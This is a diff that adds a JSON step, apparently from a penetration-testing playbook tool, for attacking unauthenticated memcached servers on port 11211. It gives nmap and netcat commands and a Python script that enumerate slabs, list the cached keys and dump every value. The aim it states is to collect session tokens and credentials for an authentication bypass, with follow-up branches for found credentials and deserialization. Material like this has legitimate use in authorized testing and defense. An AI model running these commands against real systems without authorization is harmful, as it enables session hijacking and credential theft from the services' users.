@@ -1,0 +1,22 @@
+{
+  "id": "memcached",
+  "phase": "RECON",
+  "title": "Memcached (11211)",
+  "body": "Memcached has no authentication. Dump all keys and values — it caches session tokens, credentials, and application data in plaintext.",
+  "cmd": "nmap -p 11211 -sV --script memcached-info $ip\nnc -vn $ip 11211\n\n# Dump all cached data\n# Step 1: Get slab IDs\necho \"stats slabs\" | nc -q 1 $ip 11211\n\n# Step 2: Get keys from each slab (replace N with slab number)\necho \"stats cachedump N 0\" | nc -q 1 $ip 11211\n\n# Step 3: Get value for each key\necho \"get <keyname>\" | nc -q 1 $ip 11211\n\n# Automated dump script\npython3 -c \"\nimport socket\ns = socket.socket()\ns.connect(('$ip', 11211))\ns.send(b'stats slabs\r\n')\nslabs = s.recv(4096).decode()\nprint('SLABS:', slabs[:500])\ns.send(b'stats cachedump 1 0\r\n')\nkeys = s.recv(4096).decode()\nprint('KEYS:', keys)\nfor line in keys.split('\n'):\n    if line.startswith('ITEM'):\n        key = line.split()[1]\n        s.send(f'get {key}\r\n'.encode())\n        print(s.recv(4096).decode())\ns.close()\n\"\n\n# Quick version/stats\necho \"version\" | nc -q 1 $ip 11211\necho \"stats\" | nc -q 1 $ip 11211",
+  "warn": "Memcached data is application-specific. Look for session tokens (can be used for auth bypass), user objects, and any serialized data.",
+  "choices": [
+    {
+      "label": "Found session tokens / creds in cache",
+      "next": "creds_found"
+    },
+    {
+      "label": "Found serialized objects — check for deserialization",
+      "next": "web_fuzz_deep"
+    },
+    {
+      "label": "Nothing useful",
+      "next": "unknown_service"
+    }
+  ]
+}
